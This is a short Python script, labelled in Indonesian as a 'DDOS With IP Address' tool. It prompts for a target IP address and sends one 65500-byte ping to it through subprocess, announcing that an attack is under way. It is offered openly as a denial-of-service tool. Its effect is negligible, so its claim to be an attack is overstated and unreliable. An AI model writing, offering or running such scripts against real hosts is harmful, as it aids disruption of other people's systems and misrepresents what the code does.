#!/usr/bin/env python3

#Banner
print('''

------------------------------------------------------------
                     DDOS With IP Address
------------------------------------------------------------

''')

import subprocess

target = input("Masukkan IP Address Yg Mau Di DDOS: ")
	
print("Sedang Melakukan Attack......")
	
DDOS = subprocess.run(['ping',target,'-l','65500','-w','1','-n','1'])
print('returncode:', DDOS.returncode)